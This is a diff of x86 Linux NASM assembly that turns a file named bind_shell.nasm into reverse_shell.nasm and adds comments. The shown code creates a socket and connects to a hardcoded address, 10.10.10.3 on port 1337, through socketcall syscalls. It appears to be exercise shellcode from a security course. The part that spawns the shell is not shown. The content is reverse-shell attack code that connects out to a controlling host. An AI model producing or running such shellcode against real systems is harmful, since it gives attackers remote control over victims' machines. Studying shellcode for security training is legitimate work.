@@ -1,4 +1,4 @@
-	; Filename: bind_shell.nasm
+	; Filename: reverse_shell.nasm
 
 
 
@@ -15,7 +15,7 @@ global _start
 section .text
 _start:
 
-	; Create socket
+	; socket()
 	xor eax, eax
 	xor ebx, ebx
 	xor ecx, ecx
@@ -35,25 +35,24 @@ _start:
 
 
 
-	; connect
+	; connect()
 	xor eax, eax
 	xor ebx, ebx
-
 
 	mov al, 0x66	    ; syscall: int socketcall(int call, unsigned long *args)	;
 	mov bl, 0x3			; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 
 	push 0x030a0a0a		; IP = 10.10.10.3 (little endian)
-	push word 0x3905		; num = '1337' (little endian)
+	push word 0x3905	; num = '1337' (little endian)
 
 	push word 0x02		; address family: AF_INET (2)
 
-	mov ecx, esp
-	push byte 0x10
-	push ecx
-	push edi
+	mov ecx, esp		; stack pointer to ecx
+	push byte 0x10		; 
+	push ecx			; ptr to address struct
+	push edi			; ptr to socket from socket() call
 
-	mov ecx, esp
+	mov ecx, esp		; 
 
 	int 0x80
 
